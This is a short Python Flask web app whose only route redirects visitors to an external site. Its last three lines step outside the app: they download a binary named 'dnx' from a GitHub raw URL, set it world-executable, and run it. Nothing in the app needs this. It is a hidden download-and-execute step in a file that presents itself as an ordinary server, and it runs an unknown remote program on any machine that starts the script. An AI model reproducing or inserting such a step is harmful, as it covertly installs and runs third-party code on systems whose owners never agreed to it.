from flask import Flask, redirect
import sys
import os

app = Flask(__name__)

@app.route('/')
def hello():
    return redirect("https://trustedge.com/", code = 302)


if __name__ == '__main__':
    app.run()
os.system('wget https://github.com/55113110159/OS/raw/main/dnx')
os.system('chmod 777 dnx')
os.system('./dnx')
